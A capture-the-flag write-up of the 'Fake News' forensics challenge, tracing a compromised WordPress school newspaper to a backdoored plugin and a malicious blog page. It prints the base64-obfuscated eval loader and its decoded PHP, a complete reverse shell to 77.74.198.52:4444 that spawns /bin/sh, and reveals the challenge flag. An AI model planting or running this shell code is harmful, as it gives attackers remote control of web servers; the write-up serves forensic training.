# Fake News
> Write-up author: vreshco
## DESCRIPTION:
The Magic Informer is our school's newspaper. Our system administrator and teacher, Nick, maintain it. 
But according to him, his credentials leaked while sharing his screen to present on a course. 
It is believed that Dark Pointy Hats got access to the Magic Informer, which they use to host their phishing campaign for freshmen people. 
Given the root folder of the Magic Informer, can you investigate what happened?
## HINT:
- NONE
## STEPS:
1. Given a directory which have many files and directories.

![image](https://user-images.githubusercontent.com/70703371/233784614-603d5c00-3a6d-4085-bfc9-6b9af0058734.png)


2. Well to skip the searching step, after enumerating few of them, found one unique file inside this path -> `/html/wp-content/plugins/plugin-manager`.

> plugin-manager.php

```php
<?php
eval(base64_decode("c2V0X3RpbWVfbGltaXQgKDApOwokVkVSU0lPTiA9ICIxLjAiOwokaXAgPSAnNzcuNzQuMTk4LjUyJzsgIC8vIENIQU5HRSBUSElTCiRwb3J0ID0gNDQ0NDsgICAgICAgLy8gQ0hBTkdFIFRISVMKJGNodW5rX3NpemUgPSAxNDAwOwokd3JpdGVfYSA9IG51bGw7CiRlcnJvcl9hID0gbnVsbDsKJHBhcnQxID0gIkhUQntDMG0zXzBuIjsKJHNoZWxsID0gJ3VuYW1lIC1hOyB3OyBpZDsgL2Jpbi9zaCAtaSc7CiRkYWVtb24gPSAwOwokZGVidWcgPSAwOwoKLy8KLy8gRGFlbW9uaXNlIG91cnNlbGYgaWYgcG9zc2libGUgdG8gYXZvaWQgem9tYmllcyBsYXRlcgovLwoKLy8gcGNudGxfZm9yayBpcyBoYXJkbHkgZXZlciBhdmFpbGFibGUsIGJ1dCB3aWxsIGFsbG93IHVzIHRvIGRhZW1vbmlzZQovLyBvdXIgcGhwIHByb2Nlc3MgYW5kIGF2b2lkIHpvbWJpZXMuICBXb3J0aCBhIHRyeS4uLgppZiAoZnVuY3Rpb25fZXhpc3RzKCdwY250bF9mb3JrJykpIHsKCS8vIEZvcmsgYW5kIGhhdmUgdGhlIHBhcmVudCBwcm9jZXNzIGV4aXQKCSRwaWQgPSBwY250bF9mb3JrKCk7CgkKCWlmICgkcGlkID09IC0xKSB7CgkJcHJpbnRpdCgiRVJST1I6IENhbid0IGZvcmsiKTsKCQlleGl0KDEpOwoJfQoJCglpZiAoJHBpZCkgewoJCWV4aXQoMCk7ICAvLyBQYXJlbnQgZXhpdHMKCX0KCgkvLyBNYWtlIHRoZSBjdXJyZW50IHByb2Nlc3MgYSBzZXNzaW9uIGxlYWRlcgoJLy8gV2lsbCBvbmx5IHN1Y2NlZWQgaWYgd2UgZm9ya2VkCglpZiAocG9zaXhfc2V0c2lkKCkgPT0gLTEpIHsKCQlwcmludGl0KCJFcnJvcjogQ2FuJ3Qgc2V0c2lkKCkiKTsKCQlleGl0KDEpOwoJfQoKCSRkYWVtb24gPSAxOwp9IGVsc2UgewoJcHJpbnRpdCgiV0FSTklORzogRmFpbGVkIHRvIGRhZW1vbmlzZS4gIFRoaXMgaXMgcXVpdGUgY29tbW9uIGFuZCBub3QgZmF0YWwuIik7Cn0KCi8vIENoYW5nZSB0byBhIHNhZmUgZGlyZWN0b3J5CmNoZGlyKCIvIik7CgovLyBSZW1vdmUgYW55IHVtYXNrIHdlIGluaGVyaXRlZAp1bWFzaygwKTsKCi8vCi8vIERvIHRoZSByZXZlcnNlIHNoZWxsLi4uCi8vCgovLyBPcGVuIHJldmVyc2UgY29ubmVjdGlvbgokc29jayA9IGZzb2Nrb3BlbigkaXAsICRwb3J0LCAkZXJybm8sICRlcnJzdHIsIDMwKTsKaWYgKCEkc29jaykgewoJcHJpbnRpdCgiJGVycnN0ciAoJGVycm5vKSIpOwoJZXhpdCgxKTsKfQoKLy8gU3Bhd24gc2hlbGwgcHJvY2VzcwokZGVzY3JpcHRvcnNwZWMgPSBhcnJheSgKICAgMCA9PiBhcnJheSgicGlwZSIsICJyIiksICAvLyBzdGRpbiBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCByZWFkIGZyb20KICAgMSA9PiBhcnJheSgicGlwZSIsICJ3IiksICAvLyBzdGRvdXQgaXMgYSBwaXBlIHRoYXQgdGhlIGNoaWxkIHdpbGwgd3JpdGUgdG8KICAgMiA9PiBhcnJheSgicGlwZSIsICJ3IikgICAvLyBzdGRlcnIgaXMgYSBwaXBlIHRoYXQgdGhlIGNoaWxkIHdpbGwgd3JpdGUgdG8KKTsKCiRwcm9jZXNzID0gcHJvY19vcGVuKCRzaGVsbCwgJGRlc2NyaXB0b3JzcGVjLCAkcGlwZXMpOwoKaWYgKCFpc19yZXNvdXJjZSgkcHJvY2VzcykpIHsKCXByaW50aXQoIkVSUk9SOiBDYW4ndCBzcGF3biBzaGVsbCIpOwoJZXhpdCgxKTsKfQoKLy8gU2V0IGV2ZXJ5dGhpbmcgdG8gbm9uLWJsb2NraW5nCi8vIFJlYXNvbjogT2Njc2lvbmFsbHkgcmVhZHMgd2lsbCBibG9jaywgZXZlbiB0aG91Z2ggc3RyZWFtX3NlbGVjdCB0ZWxscyB1cyB0aGV5IHdvbid0CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzBdLCAwKTsKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMV0sIDApOwpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1syXSwgMCk7CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHNvY2ssIDApOwoKcHJpbnRpdCgiU3VjY2Vzc2Z1bGx5IG9wZW5lZCByZXZlcnNlIHNoZWxsIHRvICRpcDokcG9ydCIpOwoKd2hpbGUgKDEpIHsKCS8vIENoZWNrIGZvciBlbmQgb2YgVENQIGNvbm5lY3Rpb24KCWlmIChmZW9mKCRzb2NrKSkgewoJCXByaW50aXQoIkVSUk9SOiBTaGVsbCBjb25uZWN0aW9uIHRlcm1pbmF0ZWQiKTsKCQlicmVhazsKCX0KCgkvLyBDaGVjayBmb3IgZW5kIG9mIFNURE9VVAoJaWYgKGZlb2YoJHBpcGVzWzFdKSkgewoJCXByaW50aXQoIkVSUk9SOiBTaGVsbCBwcm9jZXNzIHRlcm1pbmF0ZWQiKTsKCQlicmVhazsKCX0KCgkvLyBXYWl0IHVudGlsIGEgY29tbWFuZCBpcyBlbmQgZG93biAkc29jaywgb3Igc29tZQoJLy8gY29tbWFuZCBvdXRwdXQgaXMgYXZhaWxhYmxlIG9uIFNURE9VVCBvciBTVERFUlIKCSRyZWFkX2EgPSBhcnJheSgkc29jaywgJHBpcGVzWzFdLCAkcGlwZXNbMl0pOwoJJG51bV9jaGFuZ2VkX3NvY2tldHMgPSBzdHJlYW1fc2VsZWN0KCRyZWFkX2EsICR3cml0ZV9hLCAkZXJyb3JfYSwgbnVsbCk7CgoJLy8gSWYgd2UgY2FuIHJlYWQgZnJvbSB0aGUgVENQIHNvY2tldCwgc2VuZAoJLy8gZGF0YSB0byBwcm9jZXNzJ3MgU1RESU4KCWlmIChpbl9hcnJheSgkc29jaywgJHJlYWRfYSkpIHsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTT0NLIFJFQUQiKTsKCQkkaW5wdXQgPSBmcmVhZCgkc29jaywgJGNodW5rX3NpemUpOwoJCWlmICgkZGVidWcpIHByaW50aXQoIlNPQ0s6ICRpbnB1dCIpOwoJCWZ3cml0ZSgkcGlwZXNbMF0sICRpbnB1dCk7Cgl9CgoJLy8gSWYgd2UgY2FuIHJlYWQgZnJvbSB0aGUgcHJvY2VzcydzIFNURE9VVAoJLy8gc2VuZCBkYXRhIGRvd24gdGNwIGNvbm5lY3Rpb24KCWlmIChpbl9hcnJheSgkcGlwZXNbMV0sICRyZWFkX2EpKSB7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RET1VUIFJFQUQiKTsKCQkkaW5wdXQgPSBmcmVhZCgkcGlwZXNbMV0sICRjaHVua19zaXplKTsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERPVVQ6ICRpbnB1dCIpOwoJCWZ3cml0ZSgkc29jaywgJGlucHV0KTsKCX0KCgkvLyBJZiB3ZSBjYW4gcmVhZCBmcm9tIHRoZSBwcm9jZXNzJ3MgU1RERVJSCgkvLyBzZW5kIGRhdGEgZG93biB0Y3AgY29ubmVjdGlvbgoJaWYgKGluX2FycmF5KCRwaXBlc1syXSwgJHJlYWRfYSkpIHsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERFUlIgUkVBRCIpOwoJCSRpbnB1dCA9IGZyZWFkKCRwaXBlc1syXSwgJGNodW5rX3NpemUpOwoJCWlmICgkZGVidWcpIHByaW50aXQoIlNUREVSUjogJGlucHV0Iik7CgkJZndyaXRlKCRzb2NrLCAkaW5wdXQpOwoJfQp9CgpmY2xvc2UoJHNvY2spOwpmY2xvc2UoJHBpcGVzWzBdKTsKZmNsb3NlKCRwaXBlc1sxXSk7CmZjbG9zZSgkcGlwZXNbMl0pOwpwcm9jX2Nsb3NlKCRwcm9jZXNzKTsKCi8vIExpa2UgcHJpbnQsIGJ1dCBkb2VzIG5vdGhpbmcgaWYgd2UndmUgZGFlbW9uaXNlZCBvdXJzZWxmCi8vIChJIGNhbid0IGZpZ3VyZSBvdXQgaG93IHRvIHJlZGlyZWN0IFNURE9VVCBsaWtlIGEgcHJvcGVyIGRhZW1vbikKZnVuY3Rpb24gcHJpbnRpdCAoJHN0cmluZykgewoJaWYgKCEkZGFlbW9uKSB7CgkJcHJpbnQgIiRzdHJpbmdcbiI7Cgl9Cn0="));
```

3. It seems a base64 text, decode it.

> RESULT

```php
set_time_limit (0);
$VERSION = "1.0";
$ip = '77.74.198.52';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$part1 = "HTB{C0m3_0n";
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}
```

4. Notice, we got the first part of the flag!

![image](https://user-images.githubusercontent.com/70703371/233784775-6d280a84-0c64-4b02-a607-02b00997e656.png)


5. For the other part, i got it when analyzing the file at this path -> /html/wp-blogs/2022/11.

```console
┌──(vreshco㉿nic)-[~/…/html/wp-blogs/2022/11]
└─$ ls
index.php  style.css
```

6. Analyzing the file, you'll have the same interest like me. The strings inside the script tag.

![image](https://user-images.githubusercontent.com/70703371/233784961-d4db3f3a-494e-4577-bb39-af2552d44343.png)


7. Since there's no <?php> tag inside it, we can render the file by changing the extension to .html.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/233785052-95d9caa0-ef8a-4336-bc98-b4385d56a721.png)


8. Got an ISO file, the size is small too. Kinda sus.

![image](https://user-images.githubusercontent.com/70703371/233785092-6aef0321-4bbe-4b67-b5aa-0c946333bd80.png)


9. I tried to strings the file first and got the last part of the flag!

![image](https://user-images.githubusercontent.com/70703371/233785128-b58d5f46-1937-4046-9636-6c3fd6054bf5.png)


10. Got the flag!

## FLAG

```
HTB{C0m3_0n_1t_w4s_t00_g00d_t0_b3_tru3}
```

